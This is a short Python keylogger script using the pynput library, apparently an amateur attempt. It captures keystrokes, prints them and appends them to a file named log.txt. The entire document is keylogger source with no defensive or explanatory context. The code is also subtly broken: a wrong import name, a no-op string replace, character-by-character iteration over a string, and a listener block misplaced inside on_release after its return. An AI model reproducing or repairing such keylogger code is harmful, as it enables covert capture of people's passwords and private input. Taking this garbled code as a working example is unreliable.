import pynput

from pynput.keyboard import key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{} pressed".format(key))
    if count > 5:
     count=0
    write_file(str(keys))
    keys=[]

def write_file(keys):
    with open("log.txt","a")  as f: 
        for key in keys:
            k= str(key) .replace("'","'")
            if k.find("space") > 0:
              f.write('\n')
            elif k.find("key")== -1:
                f.write(k)

def on_release(key):
 if key ==key.esc:
  return False
 
 with Listener(on_press=on_press, on_release=on_release) as Listener:
  Listener.join()